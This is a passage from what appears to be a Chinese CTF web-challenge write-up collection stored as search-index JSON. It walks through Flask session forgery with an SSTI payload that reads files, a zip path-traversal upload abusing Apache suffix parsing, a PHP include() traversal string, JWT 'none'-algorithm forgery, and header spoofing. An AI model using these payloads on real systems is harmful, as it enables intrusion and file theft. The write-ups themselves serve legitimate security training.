\u4ece\u5bfc\u5165\u7684\u6587\u4ef6\u4e2d\u83b7\u53d6\u914d\u7f6e\nFLAG = flag          # \u5b58\u50a8flag\u503c\napp.secret_key = key # \u8bbe\u7f6eFlask\u5e94\u7528\u7684\u52a0\u5bc6\u5bc6\u94a5\n\n# \u8def\u7531\u5b9a\u4e49\uff1a/n1page \u63a5\u53d7GET\u548cPOST\u8bf7\u6c42\n@app.route(\"/n1page\", methods=[\"GET\", \"POST\"])\ndef n1page():\n    # \u5982\u679c\u4e0d\u662fPOST\u8bf7\u6c42\uff0c\u91cd\u5b9a\u5411\u5230\u9996\u9875\n    if request.method != \"POST\":\n        return redirect(url_for(\"index\"))\n\n    # \u4ece\u8868\u5355\u83b7\u53d6n1code\u53c2\u6570\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5219\u4e3aNone\n    n1code = request.form.get(\"n1code\") or None \n\n    # !!! \u4e0d\u5b89\u5168\u7684\u8f93\u5165\u8fc7\u6ee4 !!!\n    # \u4ec5\u79fb\u9664\u4e86\u90e8\u5206\u7279\u6b8a\u5b57\u7b26\uff0c\u8fc7\u6ee4\u4e0d\u5145\u5206\n    # \u5b89\u5168\u9690\u60a3\uff1a\u53ef\u80fd\u5bfc\u81f4\u6a21\u677f\u6ce8\u5165\u653b\u51fb\n    if n1code is not None:\n        n1code = n1code.replace(\".\", \"\").replace(\n            \"_\", \"\").replace(\"{\", \"\").replace(\"}\", \"\")\n\n    # \u4f1a\u8bdd\u7ba1\u7406\u903b\u8f91\n    if \"n1code\" not in session or session['n1code'] is None:\n        session['n1code'] = n1code  # \u5c06\u8fc7\u6ee4\u540e\u7684\u503c\u5b58\u5165session\n        template = None\n\n    # \u5982\u679csession\u4e2d\u6709n1code\u503c\uff0c\u6e32\u67d3\u6a21\u677f\n    if session['n1code'] is not None:\n        # !!! \u9ad8\u5371\u5b89\u5168\u8b66\u544a !!!\n        # \u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u62fc\u63a5\u7528\u6237\u8f93\u5165\n        # \u53ef\u80fd\u5bfc\u81f4XSS\u6216\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\n        template = '''&lt;h1&gt;N1 Page&lt;/h1&gt;\n        &lt;div class=\"row\"&gt;\n            &lt;div class=\"col-md-6 col-md-offset-3 center\"&gt;\n                Hello : %s, why you don't look at our \n                &lt;a href='/article?name=article'&gt;article&lt;/a&gt;?\n            &lt;/div&gt;\n        &lt;/div&gt;''' % session['n1code']\n\n        session['n1code'] = None  # \u4f7f\u7528\u540e\u6e05\u7a7asession\u503c\n        return render_template_string(template)  # \u5371\u9669\u64cd\u4f5c\uff01\n\n# \u9996\u9875\u8def\u7531\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    # \u6e32\u67d3\u4e3b\u9875\u9762\u6a21\u677f\n    return render_template(\"main.html\")\n\n# \u6587\u7ae0\u8def\u7531\n@app.route('/article', methods=['GET'])\ndef article():\n    error = 0\n    # \u83b7\u53d6name\u53c2\u6570\uff0c\u9ed8\u8ba4\u4e3a'article'\n    page = request.args.get('name', 'article')\n\n    # !!! \u4e0d\u5b8c\u5584\u7684\u5b89\u5168\u68c0\u67e5 !!!\n    # \u4ec5\u68c0\u67e5\u662f\u5426\u5305\u542b'flag'\u5b57\u7b26\u4e32\n    # \u5b89\u5168\u9690\u60a3\uff1a\u53ef\u80fd\u901a\u8fc7\u8def\u5f84\u904d\u5386\u8bbf\u95ee\u5176\u4ed6\u6587\u4ef6\n    if 'flag' in page:\n        page = 'notallowed.txt'\n\n    try:\n        # !!! \u6587\u4ef6\u64cd\u4f5c\u5b89\u5168\u98ce\u9669 !!!\n        # \u76f4\u63a5\u62fc\u63a5\u7528\u6237\u8f93\u5165\u7684\u6587\u4ef6\u8def\u5f84\n        # \u53ef\u80fd\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\n        file_path = '/home/nu11111111l/articles/{}'.format(page)\n        template = open(file_path).read()\n    except Exception as e:\n        # !!! \u4fe1\u606f\u6cc4\u9732\u98ce\u9669 !!!\n        # \u76f4\u63a5\u5c06\u5f02\u5e38\u4fe1\u606f\u8fd4\u56de\u7ed9\u7528\u6237\n        # \u53ef\u80fd\u66b4\u9732\u654f\u611f\u7cfb\u7edf\u4fe1\u606f\n        template = str(e)\n\n    # \u6e32\u67d3\u6587\u7ae0\u6a21\u677f\uff0c\u4f20\u5165\u8bfb\u53d6\u7684\u5185\u5bb9\n    return render_template('article.html', template=template)\n\n# \u4e3b\u7a0b\u5e8f\u5165\u53e3\nif __name__ == \"__main__\":\n    # \u542f\u52a8Flask\u5e94\u7528\n    # \u5b89\u5168\u5efa\u8bae\uff1a\u751f\u4ea7\u73af\u5883\u5e94\u8bbe\u7f6edebug=False\n    app.run(host='0.0.0.0', debug=False)\n</code></pre> <p>\u5728 <code>key.py</code> \u4e2d\u5f97\u5230\u5bc6\u94a5</p> <pre><code>key = 'Drmhze6EPcv0fN_81Bj-nA'\n</code></pre> <p>\u5230\u8fd9\u91cc\u65f6\u501f\u7528 Wilson Sumanang, Alexandre ZANNI \u5927\u4f6c\u7684 flask session hack \u811a\u672c</p> <pre><code>python flask_session_cookie_hack.py decode -c {cookie} -s {secert_key}\n</code></pre> <p></p> <p>\u6267\u884c\u89e3\u5bc6\u811a\u672c</p> <p></p> <p>\u7136\u540e\u628a <code>{'n1code': None}</code> \u6362\u6210\u8bfb\u6587\u4ef6 <code>flag.py</code> \u7684\u4ee3\u7801\uff0c\u52a0\u5bc6\u56de\u53bb</p> <pre><code>{'n1code': '{{\\'\\'.__class__.__mro__[2].__subclasses__()[40](\\'flag.py\\').read()}}'}\n</code></pre> <p></p> <p>\u5f97\u5230 cookie \u503c\uff0c\u4fee\u6539\u7f51\u9875 cookie \u503c\uff0c\u5728\u8868\u5355\u586b\u5165\u4efb\u610f\u503c\uff0c\u5b8c\u6210\u5bf9 <code>session['n1code']</code> \u7684\u4fee\u6539</p> <p></p> <p></p>"},{"location":"Web/Chapter24/24-1/","title":"\u538b\u7f29\u5305\u89e3\u538b\u7ed5\u8fc7","text":""},{"location":"Web/Chapter24/24-1/#\u538b\u7f29\u5305\u89e3\u538b\u7ed5\u8fc7","title":"\u538b\u7f29\u5305\u89e3\u538b\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u76f4\u63a5\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nheader(\"Content-Type:text/html; charset=utf-8\");\n// \u6bcf5\u5206\u949f\u4f1a\u6e05\u9664\u4e00\u6b21\u76ee\u5f55\u4e0b\u4e0a\u4f20\u7684\u6587\u4ef6\nrequire_once('pclzip.lib.php');\n\nif(!$_FILES){\n\n        echo '\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"zh\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt;\n    &lt;title&gt;\u6587\u4ef6\u4e0a\u4f20\u7ae0\u8282\u7ec3\u4e60\u9898&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt;\n    &lt;style type=\"text/css\"&gt;\n        .login-box{\n            margin-top: 100px;\n            height: 500px;\n            border: 1px solid #000;\n        }\n        body{\n            background: white;\n        }\n        .btn1{\n            width: 200px;\n        }\n        .d1{\n            display: block;\n            height: 400px;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;div class=\"login-box col-md-12\"&gt;\n        &lt;form class=\"form-horizontal\" method=\"post\" enctype=\"multipart/form-data\" &gt;\n            &lt;h1&gt;\u6587\u4ef6\u4e0a\u4f20\u7ae0\u8282\u7ec3\u4e60\u9898&lt;/h1&gt;\n            &lt;hr /&gt;\n            &lt;div class=\"form-group\"&gt;\n                &lt;label class=\"col-sm-2 control-label\"&gt;\u9009\u62e9\u6587\u4ef6\uff1a&lt;/label&gt;\n                &lt;div class=\"input-group col-sm-10\"&gt;\n                    &lt;div &gt;\n                    &lt;label for=\"\"&gt;\n                        &lt;input type=\"file\" name=\"file\" /&gt;\n                    &lt;/label&gt;\n                    &lt;/div&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n\n        &lt;div class=\"col-sm-8  text-right\"&gt;\n            &lt;input type=\"submit\" class=\"btn btn-success text-right btn1\" /&gt;\n        &lt;/div&gt;\n        &lt;/form&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n';\n\n    show_source(__FILE__);\n}else{\n    $file = $_FILES['file'];\n\n    if(!$file){\n        exit(\"\u8bf7\u52ff\u4e0a\u4f20\u7a7a\u6587\u4ef6\");\n    }\n    $name = $file['name'];\n\n    $dir = 'upload/';\n    $ext = strtolower(substr(strrchr($name, '.'), 1));\n    $path = $dir.$name;\n\n    function check_dir($dir){\n        $handle = opendir($dir);\n        while(($f = readdir($handle)) !== false){\n            if(!in_array($f, array('.', '..'))){\n                if(is_dir($dir.$f)){\n                    check_dir($dir.$f.'/');\n                 }else{\n                    $ext = strtolower(substr(strrchr($f, '.'), 1));\n                    if(!in_array($ext, array('jpg', 'gif', 'png'))){\n                        unlink($dir.$f);\n                    }\n                }\n\n            }\n        }\n    }\n\n    if(!is_dir($dir)){\n        mkdir($dir);\n    }\n\n    $temp_dir = $dir.md5(time(). rand(1000,9999));\n    if(!is_dir($temp_dir)){\n        mkdir($temp_dir);\n    }\n\n    if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){\n        if($ext == 'zip'){\n            $archive = new PclZip($file['tmp_name']);\n            foreach($archive-&gt;listContent() as $value){\n                $filename = $value[\"filename\"];\n                if(preg_match('/\\.php$/', $filename)){\n                     exit(\"\u538b\u7f29\u5305\u5185\u4e0d\u5141\u8bb8\u542b\u6709php\u6587\u4ef6!\");\n                 }\n            }\n            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {\n                check_dir($dir);\n                   exit(\"\u89e3\u538b\u5931\u8d25\");\n            }\n\n            check_dir($dir);\n            exit('\u4e0a\u4f20\u6210\u529f!');\n        }else{\n            move_uploaded_file($file['tmp_name'], $temp_dir.'/'.$file['name']);\n            check_dir($dir);\n            exit('\u4e0a\u4f20\u6210\u529f!');\n        }\n    }else{\n        exit('\u4ec5\u5141\u8bb8\u4e0a\u4f20zip\u3001jpg\u3001gif\u3001png\u6587\u4ef6!');\n    }\n}\n</code></pre> <p>\u5728\u4e0a\u4f20\u65f6\uff0c\u4f7f\u7528\u767d\u540d\u5355\u9a8c\u8bc1\u4e0a\u4f20\u6587\u4ef6\u540e\u7f00</p> <pre><code>if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){\n</code></pre> <p>\u4e0d\u8fc7\u672c\u4e0a\u4f20\u70b9\u652f\u6301\u4e0a\u4f20 zip \u538b\u7f29\u5305\uff0c\u4e14\u4f1a\u5c06 zip \u5305\u89e3\u538b\u5230\u6587\u4ef6\u4e0a\u4f20\u76ee\u5f55\u4e2d\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u5b89\u5168\u95ee\u9898</p> <pre><code>if($ext == 'zip'){\n            $archive = new PclZip($file['tmp_name']);\n            foreach($archive-&gt;listContent() as $value){\n                $filename = $value[\"filename\"];\n                if(preg_match('/\\.php$/', $filename)){\n                     exit(\"\u538b\u7f29\u5305\u5185\u4e0d\u5141\u8bb8\u542b\u6709php\u6587\u4ef6!\");\n                 }\n            }\n            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {\n                check_dir($dir);\n                   exit(\"\u89e3\u538b\u5931\u8d25\");\n            }\n\n            check_dir($dir);\n            exit('\u4e0a\u4f20\u6210\u529f!');\n        }\n</code></pre> <p>\u9996\u5148\u4f1a\u68c0\u6d4b\u538b\u7f29\u5305\u5185\u662f\u5426\u542b\u6709 <code>.php</code> \u6587\u4ef6\uff0c\u5982\u679c\u5b58\u5728 <code>.php</code> \u6587\u4ef6\u5c31\u76f4\u63a5\u9000\u51fa\u89e3\u538b\u6d41\u7a0b</p> <p>\u5728\u89e3\u538b\u5b8c\u6210\u540e\uff0c\u4f1a\u8c03\u7528 <code>check_dir()</code> \u65b9\u6cd5\u518d\u6b21\u68c0\u6d4b\u89e3\u538b\u51fa\u6765\u7684\u6587\u4ef6\u662f\u5426\u542b\u6709\u6076\u610f\u6587\u4ef6</p> <pre><code>    function check_dir($dir){\n        $handle = opendir($dir);\n        while(($f = readdir($handle)) !== false){\n            if(!in_array($f, array('.', '..'))){\n                if(is_dir($dir.$f)){\n                    check_dir($dir.$f.'/');\n                 }else{\n                    $ext = strtolower(substr(strrchr($f, '.'), 1));\n                    if(!in_array($ext, array('jpg', 'gif', 'png'))){\n                        unlink($dir.$f);\n                    }\n                }\n\n            }\n        }\n    }\n</code></pre> <p>\u5e76\u4e14\u56e0\u4e3a\u89e3\u538b\u5230\u7684\u76ee\u5f55\u662f\u4e00\u4e2a\u968f\u673a\u751f\u6210\u7684\u76ee\u5f55\uff0c\u76ee\u5f55\u540d\u65e0\u6cd5\u9884\u6d4b\uff0c\u4e0e\u5bfc\u81f4\u4e0d\u80fd\u4f7f\u7528\u6761\u4ef6\u7ade\u4e89\u65b9\u6cd5</p> <pre><code>if(!is_dir($dir)){\n        mkdir($dir);\n    }\n\n    $temp_dir = $dir.md5(time(). rand(1000,9999));\n    if(!is_dir($temp_dir)){\n        mkdir($temp_dir);\n    }\n</code></pre> <p>\u9996\u5148\u6765\u7ed5\u7b2c\u4e00\u4e2a\u8fc7\u6ee4\uff0c \u9ed1\u540d\u5355\u8fc7\u6ee4\u4e86 php \u6587\u4ef6\uff0c\u538b\u7f29\u5305\u5185\u4e0d\u80fd\u542b\u6709 <code>.php</code> \u6587\u4ef6\uff0c\u8fd9\u91cc\u6b63\u5219\u4e3a <code>.php$</code> \u9650\u5236\u4e86\u7ed3\u5c3e</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5c1d\u8bd5 <code>php3\u3001php5\u3001phtml</code> \u7b49\u7ed5\u8fc7\uff0c\u4e0d\u8fc7\u670d\u52a1\u7aef\u53ea\u914d\u7f6e\u4e86\u89e3\u6790 php \u6587\u4ef6\uff0c\u5bfc\u81f4\u8be5\u7c7b\u7ed5\u8fc7\u4e0d\u53ef\u7528</p> <p></p> <p>\u6839\u636e 404 \u9875\u9762,\u53d1\u73b0\u4f7f\u7528\u7684\u662f apache\uff0c\u5f88\u5bb9\u6613\u8054\u60f3\u5230 apache \u7684\u591a\u540e\u7f00\u6587\u4ef6\u89e3\u6790\u6f0f\u6d1e</p> <p>\u8fd9\u91cc\u9009\u62e9\u4e0a\u4f20\u4e00\u4e2a <code>x.php.xxx</code> \u6587\u4ef6</p> <p>\u901a\u8fc7 010editor \u6784\u9020\u6076\u610f\u538b\u7f29\u5305\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4fee\u6539\u540e\u7684\u6587\u4ef6\u540d\u957f\u5ea6\u4e0e\u4fee\u6539\u524d\u4e00\u81f4\uff0c\u5426\u5219\u89e3\u538b\u4f1a\u62a5\u9519</p> <p>\u8fd9\u91cc\u6539\u4e3a <code>/../../jason07.php.xxx</code></p> <p></p> <p>\u4e0a\u4f20\u538b\u7f29\u5305\uff0c\u8bbf\u95ee <code>jason07.php.xxx</code>\uff0c\u5f97\u5230 flag</p> <p></p>"},{"location":"Web/Chapter24/24-2/","title":"include() \u76ee\u5f55\u7a7f\u8d8a","text":""},{"location":"Web/Chapter24/24-2/#include-\u76ee\u5f55\u7a7f\u8d8a","title":"include() \u76ee\u5f55\u7a7f\u8d8a","text":"<p>\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0 <code>source.php</code>\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u8bbf\u95ee <code>source.php</code> \u62ff\u5230\u6e90\u7801</p> <pre><code>&lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&amp;$page)\n        {\n            $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        &amp;&amp; is_string($_REQUEST['file'])\n        &amp;&amp; emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\";\n    }  \n?&gt;\n</code></pre> <p>\u67e5\u770b hint.php\uff0c\u53d1\u73b0</p> <pre><code>flag not here, and flag in ffffllllaaaagggg\n</code></pre> <p>\u4f20\u5165 <code>file=hint.php</code>\uff0c\u9996\u5148\u68c0\u67e5 <code>hint.php</code> \u662f\u5426\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5b83\u662f\u5b57\u7b26\u4e32\uff0c\u6761\u4ef6\u901a\u8fc7</p> <pre><code>if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n</code></pre> <p>\u68c0\u67e5 <code>hint.php</code> \u662f\u5426\u5728\u767d\u540d\u5355\u4e2d\uff08\u767d\u540d\u5355\u5305\u62ec <code>hint.php</code> \u548c <code>source.php</code>\uff09\uff0c\u5728\uff0c\u7ee7\u7eed\u6267\u884c\u540e\u9762\u7684\u4ee3\u7801</p> <pre><code>if (in_array($page, $whitelist)) {\n                return true;\n            }\n</code></pre> <p>\u5bf9 <code>hint.php</code> \u6267\u884c <code>mb_substr()</code> \u51fd\u6570\uff0c\u4f46\u662f\u51fd\u6570\u5185\u4e00\u4e2a\u53c2\u6570\u662f\u6765\u81ea\u53e6\u4e00\u4e2a\u51fd\u6570 <code>mb_strpos()</code> \u7684\u8fd4\u56de\u503c\uff0c\u56e0\u6b64\u6211\u4eec\u5148\u770b<code>mb_strpos()</code> \u51fd\u6570</p> <p>\u4f7f\u7528 <code>.</code> \u8fdb\u884c\u5b57\u7b26\u8fde\u63a5\uff0c\u5373\u8fde\u63a5\u4e86\u4e00\u4e2a\u95ee\u53f7\u5b57\u7b26 <code>?</code>\uff0c\u5f97\u5230 <code>hint.php?</code></p> <p>\u7136\u540e\u67e5\u627e <code>?</code> '\u5728\u5b57\u7b26\u4e32 <code>hint.php?</code> \u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u4ece 0 \u5f00\u59cb\u7b97\uff0c\u8fd4\u56de 8\uff0c\u5373 length=8</p> <pre><code>mb_strpos($page . '?', '?')\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884c <code>mb_substr()</code> \u51fd\u6570\uff0c\u5373 <code>mb_substr('hint.php',0,8)</code></p> <p>\u4ece\u5b57\u7b26\u4e32\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5904\u5f00\u59cb\uff0c\u8fd4\u56de 8 \u4e2a\u5b57\u7b26\uff0c\u5176\u5b9e\u8fd8\u662f\u8fd4\u56de\u7684 <code>hint.php</code>\uff1b</p> <pre><code>$_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n</code></pre> <p>\u7136\u540e\u5bf9\u8fd4\u56de\u7684\u5185\u5bb9\u8fdb\u884c URL \u89e3\u7801\uff0c\u91cd\u590d\u6267\u884c\u4e0a\u9762\u7684\u68c0\u67e5\u548c\u622a\u53d6\u64cd\u4f5c</p> <pre><code>$_page = urldecode($page);\n</code></pre> <p>\u6211\u4eec\u53ea\u9700\u8981\u4f20\u5165\u4e00\u4e2a\u5728\u767d\u540d\u5355\u5185\u7684\u6587\u4ef6\u540d\uff08<code>source.php</code> \u6216\u8005 <code>hint.php</code>\uff09\uff0c\u5e76\u6dfb\u52a0\u4e0a\u95ee\u53f7\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u6bcf\u6b21\u627e\u53bb\u7528\u4e8e\u68c0\u67e5\u7684\u5185\u5bb9\u90fd\u5728\u767d\u540d\u5355\uff0c\u8fd4\u56de true</p> <pre><code>source.php?file=hint.php?/../../../../ffffllllaaaagggg\n</code></pre> <p></p>"},{"location":"Web/Chapter25/25-1/","title":"API \u63a5\u53e3\u6cc4\u9732","text":""},{"location":"Web/Chapter25/25-1/#api-\u63a5\u53e3\u6cc4\u9732","title":"API \u63a5\u53e3\u6cc4\u9732","text":"<p>\u7ed9\u4e86\u4e00\u4e2a\u9875\u9762\u9996\u5148\u770b\u770b\u529f\u80fd\uff0c\u6709\u4e00\u4e2a API \u6587\u6863</p> <p></p> <p>\u8fdb\u53bb\u662f\u4e00\u4e2a Swagger UI \u9875\u9762\uff0c\u6709\u4e00\u4e9b\u63a5\u53e3</p> <p></p> <p>\u5728\u6700\u4e0b\u9762\u6709\u4e2a GET \u8bf7\u6c42\u7684 <code>/heapdump</code></p> <p></p> <p>\u70b9\u51fb Try ie out \u53ef\u4ee5\u770b\u5230\u8be6\u7ec6\u7684\u6570\u636e\uff0c\u6709\u4e2a\u4e0b\u8f7d\u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u6587\u4ef6\u7528 vscode \u6253\u5f00\u641c\u7d22\u6807\u5fd7\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter26/26-1/","title":"\u5e76\u53d1\u6f0f\u6d1e","text":""},{"location":"Web/Chapter26/26-1/#\u5e76\u53d1\u6f0f\u6d1e","title":"\u5e76\u53d1\u6f0f\u6d1e","text":"<p>\u6253\u5f00\u7f51\u7ad9\u50cf\u8fd9\u6837\u968f\u4fbf\u8fde\u63a5\u7136\u540e\u63d0\u4ea4\u53ef\u4ee5\u770b\u5230\u53d1\u51fa\u4e86\u4e00\u4e2a\u5305</p> <p></p> <p>\u53f3\u952e\u91cd\u53d1\u8fbe\u5230\u5e76\u53d1\u7684\u6548\u679c\u53ef\u4ee5\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter3/3-1/","title":"HTTP \u54cd\u5e94\u5934\u6cc4\u9732","text":""},{"location":"Web/Chapter3/3-1/#http-\u54cd\u5e94\u5934\u6cc4\u9732","title":"HTTP \u54cd\u5e94\u5934\u6cc4\u9732","text":"<p>\u6253\u5f00\u7f51\u9875\u5565\u4e5f\u6ca1\u6709</p> <p></p> <p>\u6253\u5f00 F12 \u5728\u7f51\u7edc\u4e2d\u5237\u65b0\u7f51\u9875\u91cd\u65b0\u8bf7\u6c42\u62ff\u5230 flag \u5728\u54cd\u5e94\u5934\u4e2d</p> <p></p>"},{"location":"Web/Chapter3/3-10/","title":"JWT \u7b97\u6cd5\u6df7\u6dc6\u7ed5\u8fc7\uff08CVE-2015-9235\uff09","text":""},{"location":"Web/Chapter3/3-10/#jwt-\u7b97\u6cd5\u6df7\u6dc6\u7ed5\u8fc7cve-2015-9235","title":"JWT \u7b97\u6cd5\u6df7\u6dc6\u7ed5\u8fc7\uff08CVE-2015-9235\uff09","text":"<p>\u53d1\u73b0\u662f\u4e2a\u767b\u5f55\u9875\u9762</p> <p></p> <p>\u67e5\u770b\u6e90\u7801\u53d1\u73b0\u6cc4\u9732\u4e86\u767b\u5f55\u63a5\u53e3</p> <p></p> <p>\u5168\u5c40\u53d8\u91cf token`</p> <pre><code>let token = '';\n</code></pre> <p>\u767b\u5f55\u4e8b\u4ef6\u5904\u7406</p> <pre><code>document.getElementById('loginBtn').addEventListener('click', async () =&gt; {\n    const username = document.getElementById('username').value;\n    const password = document.getElementById('password').value;\n    try {\n        const response = await fetch('/login', {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({ username, password })\n        });\n        const data = await response.json();\n        if (response.ok) {\n            token = data.token;\n            // \u66f4\u65b0 UI \u663e\u793a\u6210\u529f\uff0c\u5207\u6362\u89c6\u56fe\n        } else {\n            // \u663e\u793a\u540e\u7aef\u8fd4\u56de\u7684\u9519\u8bef\u4fe1\u606f\n        }\n    } catch (error) {\n        // \u7f51\u7edc\u6216\u89e3\u6790\u9519\u8bef\u5904\u7406\n    }\n});\n</code></pre> <p>\u9690\u85cf\u63a5\u53e3\u5904\u7406</p> <pre><code>document.getElementById('getSecretBtn').addEventListener('click', async () =&gt; {\n    try {\n        const response = await fetch('/get_secret', {\n            method: 'GET',\n            headers: { 'Authorization': token }\n        });\n        const data = await response.json();\n        if (response.ok) {\n            // \u62fc\u88c5\u5e76\u5c55\u793a data.message\u3001data.public\u3001data.confidential\u3001data.flag\n        } else {\n            // \u5c55\u793a data.error\n        }\n        // \u663e\u793a\u7ed3\u679c\u533a\u57df\n    } catch (error) {\n        // \u7f51\u7edc\u6216\u89e3\u6790\u9519\u8bef\u63d0\u793a\n    }\n});\n</code></pre> <p>\u767b\u51fa\u903b\u8f91</p> <pre><code>document.getElementById('logoutBtn').addEventListener('click', () =&gt; {\n    token = '';\n    // \u6e05\u7a7a\u8f93\u5165\u3001\u9690\u85cf\u7ed3\u679c\u3001\u5207\u6362\u56de\u767b\u5f55\u533a\n});\n</code></pre> <p>Authorization \u6709\u4e00\u4e9b\u5e38\u89c1\u7684\u8ba4\u8bc1\u6388\u6743\u65b9\u6848\u5982\uff1aBasic\u8ba4\u8bc1\u3001Digest\u8ba4\u8bc1\u3001Beare\u8ba4\u8bc1\u3001JWT \u8ba4\u8bc1\u7b49</p> <p>JWT \u7684\u8bdd\u5b58\u5728\u4f2a\u9020\u7b49\u6f0f\u6d1e\u66f4\u7b26\u5408 CTF</p> <p>\u53bb\u8fd9\u4e2a\u7f51\u7ad9\u6784\u9020\u4e00\u4e2a\u7b7e\u540d</p> <p></p> <p>\u8fd4\u56de 401 \u9519\u8bef\uff0cJWT \u7684\u7b97\u6cd5\u65e0\u6548</p> <p></p> <p>JWT \u7b97\u6cd5\u5b58\u5728\u6f0f\u6d1e CVE-2015-9235\uff0c\u53ef\u4ee5\u5c06 <code>header</code> \u4e2d\u7b7e\u540d\u7b97\u6cd5\u6539\u4e3a <code>none</code> \u8fdb\u884c\u7ed5\u8fc7</p> <p></p> <p>\u4fee\u6539\u540e\u53d1\u9001\u8fc7\u53bb\u4e86\u53ea\u5c55\u793a\u4e86 <code>message</code> \u548c <code>public</code></p> <p></p> <p>\u770b\u4e0a\u9762\u5206\u6790\u7684\u4ee3\u7801\u8fd8\u6709 <code>confidential</code> \u548c <code>flag</code> \u6ca1\u6709\u5c55\u793a\uff0c\u63a8\u6d4b\u5e94\u8be5\u7f3a\u5c11\u4e86\u6743\u9650</p> <p>\u548c\u6743\u9650\u76f8\u5173\u7684\u5e38\u89c1\u5b57\u7b26\u4e32\u5982\uff1a<code>role</code>\uff0c<code>account</code>\uff0c<code>isAdmin</code> \u7b49\uff0c\u5206\u522b\u4f2a\u9020\u6bcf\u4e2a\u503c\u4e3a <code>admin</code></p> <p>\u7ed3\u679c <code>role</code> \u662f\u53ef\u7528\u7684</p> <p></p>"},{"location":"Web/Chapter3/3-11/","title":"\u81ea\u5b9a\u4e49 Code \u9a8c\u8bc1\u7206\u7834","text":""},{"location":"Web/Chapter3/3-11/#\u81ea\u5b9a\u4e49-code-\u9a8c\u8bc1\u7206\u7834","title":"\u81ea\u5b9a\u4e49 Code \u9a8c\u8bc1\u7206\u7834","text":"<p>\u6253\u5f00\u9875\u9762</p> <p></p> <p>\u626b\u63cf\u76ee\u5f55\u6709\u4e2a <code>/admin</code>\uff0c\u8bbf\u95ee\u9650\u5236\u4e3a\u672c\u5730\u7528\u6237</p> <p></p> <p>\u6dfb\u52a0 XFF \u5934\u7ed5\u8fc7</p> <pre><code>X-Forwarded-For: 127.0.0.1\n</code></pre> <p></p> <p>\u70b9\u51fb Get Flag \u53c8\u663e\u793a\u540c\u6837\u7684\u8981\u6c42</p> <p></p> <p>\u4f2a\u9020\u540e\u53d1\u73b0\u62a5\u9519</p> <pre><code>X-Forwarded-For: 127.0.0.1\n</code></pre> <p></p> <p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u5bf9 <code>X-Internal-Auth</code> \u5b57\u6bb5\u6709\u9a8c\u8bc1</p> <p>\u6839\u636e\u63d0\u793a <code>Incorrect code</code> \u731c\u6d4b\u4e0d\u662f 000</p> <p></p> <p>\u5bf9\u6570\u5b57\u7206\u7834\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter3/3-12/","title":"\u4f2a\u9020 X-Real-IP \u5730\u5740","text":""},{"location":"Web/Chapter3/3-12/#\u4f2a\u9020-x-real-ip-\u5730\u5740","title":"\u4f2a\u9020 X-Real-IP 